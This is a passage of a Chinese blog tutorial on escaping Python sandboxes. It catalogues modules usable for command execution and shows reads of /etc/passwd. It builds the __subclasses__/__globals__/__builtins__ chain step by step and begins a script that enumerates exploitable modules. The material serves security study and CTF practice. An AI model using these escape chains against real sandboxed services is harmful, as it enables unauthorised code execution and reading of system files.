的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。</p><ul><li>通过 from a import b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。通过 import a as b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。对于嵌套导入的，比如 a.py 中存在一个 import b，那么 import a 时，a 和 b 模块都会被添加到 sys.modules 字典中，a 会被导入到当前的 Local 命名空间中，虽然模块 b 已经加载到内存了，如果访问还要再明确的在本模块中 import b。</li><li>导入模块时会执行该模块。</li><li>所以说如果某一个模块导入了os模块，我们就可以利用该模块的 dict 进而使用os模块，如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line">linecache.__dict__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">linecache.os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><h2 id="0x02-可利用的模块和方法"><a href="#0x02-可利用的模块和方法" class="headerlink" title="0x02 可利用的模块和方法"></a>0x02 可利用的模块和方法</h2><p>在 Python 的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。</p><h3 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h3><h4 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 执行shell命令不会返回shell的输出</span></span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment"># 会产生返回值，可通过read()的方式读取返回值</span></span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br></pre></td></tr></table></figure><h4 id="commands模块"><a href="#commands模块" class="headerlink" title="commands模块"></a>commands模块</h4><p>commands模块会返回命令的输出和执行的状态位，仅限Linux环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">commands.getstatusoutput(<span class="string">"ls"</span>)</span><br><span class="line">commands.getoutput(<span class="string">"ls"</span>)</span><br><span class="line">commands.getstatus(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure><h4 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call(command, shell=<span class="keyword">True</span>)</span><br><span class="line">subprocess.Popen(command, shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h4 id="pty模块"><a href="#pty模块" class="headerlink" title="pty模块"></a>pty模块</h4><p>仅限Linux环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure><h4 id="timeit模块"><a href="#timeit模块" class="headerlink" title="timeit模块"></a>timeit模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure><h4 id="import-函数"><a href="#import-函数" class="headerlink" title="__import__()函数"></a>__import__()函数</h4><p>这个函数只是通过引入其他命令执行库实现命令执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure><h4 id="importlib模块"><a href="#importlib模块" class="headerlink" title="importlib模块"></a>importlib模块</h4><p>和上面同理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># Python3可以，Python2没有该函数</span></span><br><span class="line">importlib.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><h4 id="exec-eval-execfile-compile-函数"><a href="#exec-eval-execfile-compile-函数" class="headerlink" title="exec()/eval()/execfile()/compile()函数"></a>exec()/eval()/execfile()/compile()函数</h4><p>这几个函数都能执行参数的Python代码。</p><p>注意：execfile()只存在于Python2，Python3没有该函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"__import__('os').system('calc')"</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">'__import__("os").system("calc")'</span>)</span><br><span class="line"></span><br><span class="line">execfile(<span class="string">'exp.py'</span>)</span><br><span class="line"><span class="comment"># 过滤import的情况可如下Bypass</span></span><br><span class="line">execfile(<span class="string">"E:\Python27\Lib\os.py"</span>)</span><br><span class="line">system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">exec(compile(<span class="string">'__import__("os").system("calc")'</span>, <span class="string">'&lt;string&gt;'</span>, <span class="string">'exec'</span>))</span><br></pre></td></tr></table></figure><h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><p>该模块通过modules()函数引入命令执行模块来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><h3 id="文件操作类"><a href="#文件操作类" class="headerlink" title="文件操作类"></a>文件操作类</h3><h4 id="file-函数"><a href="#file-函数" class="headerlink" title="file()函数"></a>file()函数</h4><p>该函数只存在于Python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">file(<span class="string">'test.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure><h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">open(<span class="string">'test.txt'</span>,<span class="string">'a'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure><h4 id="codecs模块"><a href="#codecs模块" class="headerlink" title="codecs模块"></a>codecs模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">codecs.open(<span class="string">'test.txt'</span>, <span class="string">'w'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取当前Python环境信息"><a href="#获取当前Python环境信息" class="headerlink" title="获取当前Python环境信息"></a>获取当前Python环境信息</h3><h4 id="sys模块-1"><a href="#sys模块-1" class="headerlink" title="sys模块"></a>sys模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure><h2 id="0x03-沙箱逃逸技巧"><a href="#0x03-沙箱逃逸技巧" class="headerlink" title="0x03 沙箱逃逸技巧"></a>0x03 沙箱逃逸技巧</h2><h3 id="元素链"><a href="#元素链" class="headerlink" title="元素链"></a>元素链</h3><h4 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h4><p>下面简单过下元素链的构造过程。</p><p>由前面知道，我们可以通过如下方式获取object类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure><p><img src="/2019/05/31/Python沙箱逃逸小结/1.png" alt=""></p><p>然后通过object类的__subclasses__()方法获取所有的子类列表（Python2和Python3获取的子类不同）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br></pre></td></tr></table></figure><p><img src="/2019/05/31/Python沙箱逃逸小结/2.png" alt=""></p><p>找到重载过的__init__类，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__</span><br></pre></td></tr></table></figure><p>在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。</p><p><img src="/2019/05/31/Python沙箱逃逸小结/3.png" alt=""></p><p>写个脚本帮我们来筛选出重载过的__init__类的类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = len(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'wrapper'</span> <span class="keyword">not</span> <span class="keyword">in</span> str(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[i].__init__):</span><br><span class="line">        <span class="keyword">print</span> (i, <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure><p><img src="/2019/05/31/Python沙箱逃逸小结/4.png" alt=""></p><p>重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br></pre></td></tr></table></figure><p>寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>]</span><br></pre></td></tr></table></figure><p>再在keys中寻找可利用的函数即可，如file()函数为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'E:/passwd'</span>).read()</span><br></pre></td></tr></table></figure><p><img src="/2019/05/31/Python沙箱逃逸小结/5.png" alt=""></p><p>至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。</p><h4 id="使用脚本遍历其他逃逸方法"><a href="#使用脚本遍历其他逃逸方法" class="headerlink" title="使用脚本遍历其他逃逸方法"></a>使用脚本遍历其他逃逸方法</h4><p>Python2的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"></span><br><span class="line">find_modules = &#123;<span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hotshot'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tty'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'whichdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'runpy'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-atheos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sgmllib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserList'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimify'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'smtplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compiler'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'SocketServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-darwin'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'repr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-irix6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd8'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cookielib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ConfigParser'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'httplib'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_MozillaCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-riscos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Bastion'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dircache'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'SimpleHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'popen2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'toaiff'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'atexit'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'HTMLParser'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'BaseHTTPServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-unixware7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plistlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'rfc822'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'urllib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fpformat'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'re'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'mutex'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserString'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'new'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'email'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ftplib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-linux2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserDict'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'Queue'</span>: [<span class="string">'__builtins__'</span>], 